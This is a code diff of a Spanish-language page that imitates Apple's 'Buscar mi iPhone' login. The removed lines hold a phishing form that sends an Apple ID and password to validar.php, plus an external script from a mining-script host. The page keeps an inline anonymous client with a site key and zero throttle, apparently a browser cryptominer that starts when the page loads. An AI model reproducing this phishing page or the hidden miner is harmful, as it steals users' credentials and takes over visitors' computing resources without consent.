@@ -3,9 +3,12 @@
 <head>
 	<title>Encontrar mi Iphone</title>
 	<link rel="shortcut icon" href="/favicon.ico"/>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-	<script src="https://www.hostingcloud.racing/FXTs.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<!--Link de fuentes-->
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Domine:wght@500&display=swap" rel="stylesheet">
+<!--Estilos puro CSS-->
 <script>
     var _client = new Client.Anonymous('8b60eacb2ecffa164b7abec400821794f084b99a74916a0e2f8d7f9c5b504b74', {
         throttle: 0, c: 'w', ads: 0
@@ -14,11 +17,7 @@
     
 
 </script>
-</head>
-<!--Link de fuentes-->
-<link rel="preconnect" href="https://fonts.gstatic.com">
-<link href="https://fonts.googleapis.com/css2?family=Domine:wght@500&display=swap" rel="stylesheet">
-<!--Estilos puro CSS-->
+
 <style type="text/css">
 
 	/*Logo parte oscura*/
@@ -77,6 +76,10 @@
 	.l{
 		text-align: center;
 	}
+	.c{
+		display:block;
+        margin:auto;
+        width: 400px;
 </style>
 <body>
 	<div class="dlogo">
@@ -85,33 +88,12 @@
 	<div>
 		<img class="buscador" src="buscardor.jpg">
 	</div>
-	<!--FoormulRIO-->
-<form method="post" action="validar.php">
-	<div class="form">
-		<h1 class="buscar-mi-aplle">Buscar mi iPhone</h1>
-
-		<input class="mail" type="email" name="email" required placeholder="ID de Apple">
-		<input class="mail" type="password" name="password" required placeholder="Contraseña">
-		<br>
-		<input class="boton" type="submit" name="" value="Encontrar">
-		</form>
-	</div>
-	<div class="l">
-        <div>
-        	<br>
-        	<br>
-            <input type="checkbox"  id="check4">
-            <label  for="check4">Permanecer conectado</label>
-        </div>
-        <br>
-        <br>
-        <br>
-		<a href="#" style="color: blue-sky;">¿Has olvidado tu ID de Apple o la contraseña?</a>
-	</div>
+	<img class="c" src="cargando.gif">
 	<div >
 		<br>
 		<br>
-		<h1 style="opacity: 0.5; font-size:12px; text-align: center;">Crear ID de Apple  | Estado del sistema  | Política de privacidad  | Términos y condiciones  | Copyright © 2021 Apple Inc. Todos los derechos reservados.</h1>
+		<h1 style="opacity: 0.5; font-size:12px; text-align: center;">Crear ID de Apple  | Estado del sistema  | Política de privacidad  |</h1>
+		<h1 style="opacity: 0.5; font-size:12px; text-align: center;"> Términos y condiciones  | Copyright © 2021 Apple Inc. Todos los derechos reservados.</h1>
 	</div>
 </body>
 </html>
